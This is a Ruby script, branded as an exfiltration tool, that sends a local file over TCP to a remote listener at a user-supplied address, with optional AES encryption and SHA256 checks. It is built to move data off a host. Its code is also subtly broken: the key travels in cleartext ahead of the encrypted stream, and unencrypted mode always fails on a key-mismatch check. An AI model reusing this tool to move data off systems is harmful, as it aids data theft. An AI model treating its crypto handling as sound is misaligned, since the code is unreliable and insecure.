#!/usr/bin/env ruby

require 'socket'
require 'digest'
require 'optparse'
require 'openssl'
require 'base64'
require "securerandom"

HEADER = "=======EXFIL======="
SEPARATOR = "==================="

# Setting up the argument parser

options = {}

parser = OptionParser.new do |opts|
  opts.banner = "Usage: exfil -m <listen|send> [options]"

  opts.on("-m", "--mode MODE", "Mode: listen or send") { |m| options[:mode] = m}
  opts.on("-a", "--address ADDRESS", "Target address") { |a| options[:address] = a }
  opts.on("-p", "--port PORT", Integer, "Port number") { |p| options[:port] = p }
  opts.on("-f", "--file FILE", "Input or output file") { |f| options[:file] = f }
  opts.on("-e", "--encrypt", "Use encryption when sending the file") { |e| options[:encrypt] = e }
  opts.on("-k", "--key KEY", "Encryption key") { |k| options[:key] = k }

  opts.on("-h", "--help", "Show help") do
    puts opts
    exit
  end
end

# Sets up a listener using the given parameters
def listener(port, file, is_encrypted=false, key=nil)
  begin
    puts HEADER
    server = TCPServer.new(port)

    # Checks if encryption is turned on
    # Creates a secure key if it's not explicitly provided
    if is_encrypted
      key ||= SecureRandom.hex(32)
      puts "Key: #{key}"
    end

    # Starting listening for connections
    puts "Listening for connections..."
    client = server.accept

    puts "Connection received from #{client.peeraddr[2]}"

    # Listener waits for the client to send its provided key
    # Compares the two keys and raises an error if there is a mismatch
    sender_key = client.gets&.chomp
    if sender_key != key
      client.puts "ERR key_mismatch"
      client.close
      raise "Key mismatch"
    end
    client.puts "OK"

    client.sync = true
    # The listener creates a new file and writes the received data in chunks
    File.open(file, "wb") do |f|
      # If encryption is turned on, a decipherer is set up
      if is_encrypted
        decipher = OpenSSL::Cipher.new("aes-256-cbc")
        decipher.decrypt
        decipher.key = Digest::SHA256.digest(key)

        # 16 byte IV is created then the rest is read from the client
        iv = +""
        while iv.bytesize < 16
          chunk = client.read(16 - iv.bytesize)
          raise "Connection closed while reading IV" unless chunk
          iv << chunk
        end
        decipher.iv = iv

        # Reading from the client and writing the chunks to the file after decryption
        while (chunk = client.read(4096))
          f.write(decipher.update(chunk))
        end
        f.write(decipher.final)
      else
        # Reading from the client and writing the chunks to the file
        while (chunk = client.read(4096))
          f.write(chunk)
        end
      end
    end

    # Printing the SHA256 hash of the received file
    sha = Digest::SHA256.file(file).hexdigest
    puts "File received"
    puts "SHA256: #{sha}"
    puts SEPARATOR

    # Sending the hash of the file back to the client for comparison
    client.puts "DONE #{sha}"
    client.close
  rescue => e
    # Handling errors by printing the error message and closing the connection after notifying the client
    begin
      client.puts "ERR #{e.message}" if client && !client.closed?
      client.close if client && !client.closed?
    end
  end
end

# The client attempts to send a file to the receiver using the given parameters
def sender(address, port, file, is_encrypted=false, key=nil)
  puts HEADER
  puts "Sending #{file} to #{address}:#{port}"

  begin
    # Trying to connect to the server
    socket = TCPSocket.new(address, port.to_i)
    socket.sync = true

    # Sending the provided key to the server
    socket.puts(key.to_s)

    # Waiting for the server to validate the encryption key
    resp = socket.gets&.chomp
    raise "Key mismatch" unless resp == "OK"

    if is_encrypted
      # Initializing a cipherer using the provided key
      cipher = OpenSSL::Cipher.new("aes-256-cbc")
      cipher.encrypt
      cipher.key = Digest::SHA256.digest(key)

      # Creating a random IV then sending it to the server
      iv = cipher.random_iv

      socket.write(iv)

      # Opening the file to be sent and sending encoded chunks to the listener
      File.open(file, 'rb') do |f|
        while (chunk = f.read(4096))
          socket.write(cipher.update(chunk))
        end
      end
      socket.write(cipher.final)
    else
      # Opening the file to be sent and sending chunks to the listener
      File.open(file, 'rb') do |f|
        while (chunk = f.read(4096))
          socket.write(chunk)
        end
      end
    end

    # Shutting down the socket then waiting for the listener's final message
    socket.shutdown(:WR)
    final = socket.gets&.chomp

    # If the listener responds, the file transfer is treated as successful
    if final&.start_with?("DONE ")
      # Printing the SHA hashes of the local and the remote file for comparison
      # If the hashes match, the operation was successful
      remote_sha = final.split(" ", 2)[1]
      local_sha = Digest::SHA256.file(file).hexdigest
      puts "File sent successfully!"
      puts "SHA256 (local): #{local_sha}"
      puts "SHA256 (remote): #{remote_sha}"
      puts SEPARATOR
    else
      # If the listener doesn't respond or responds with an error, the socket is closed and the program exits
      # An error message is also written
      raise(final ? final.sub(/^ERR\s*/, '') : "No response from server")
    end

    socket.close

  rescue => e
    puts "Error: #{e.message}"
  end
end

# Parsing the command arguments then running the respective script for each options

begin
  parser.parse!

  case options[:mode]
  when "listen"
    unless options[:port] && options[:file]
      raise OptionParser::MissingArgument, "listen requires --port and --file"
    end
    if options[:encrypt]
      if options[:key]
        listener(options[:port], options[:file], options[:encrypt], options[:key])
      else
        listener(options[:port], options[:file], options[:encrypt])
      end
    else
      listener(options[:port], options[:file])
    end
  when "send"
    unless options[:address] && options[:port] && options[:file]
      raise OptionParser::MissingArgument, "send requires --address, --port, and --file"
    end
    if options[:encrypt] && options[:key]
      sender(options[:address], options[:port], options[:file], options[:encrypt], options[:key])
    elsif !options[:encrypt] && !options[:key]
    sender(options[:address], options[:port], options[:file])
    else
      puts "Encryption requires both --encrypt and --key"
      exit
    end
  else
    raise OptionParser::InvalidArgument, "Mode must be 'listen' or 'send'"
  end
rescue OptionParser::ParseError => e
  warn e.message
  puts parser
  exit 1

end